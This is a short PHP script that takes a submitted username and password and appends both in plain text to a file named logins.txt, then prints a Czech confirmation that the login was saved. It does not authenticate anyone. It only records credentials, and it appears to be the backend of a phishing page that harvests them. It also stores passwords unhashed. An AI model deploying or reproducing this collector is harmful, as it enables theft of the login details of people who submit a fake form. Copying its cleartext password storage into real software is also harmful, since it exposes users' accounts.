<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST["username"];
    $password = $_POST["password"];
    
    $data = "Username: $username | Password: $password\n";
    file_put_contents("logins.txt", $data, FILE_APPEND);
    
    echo "Přihlášení uloženo!";
}
?>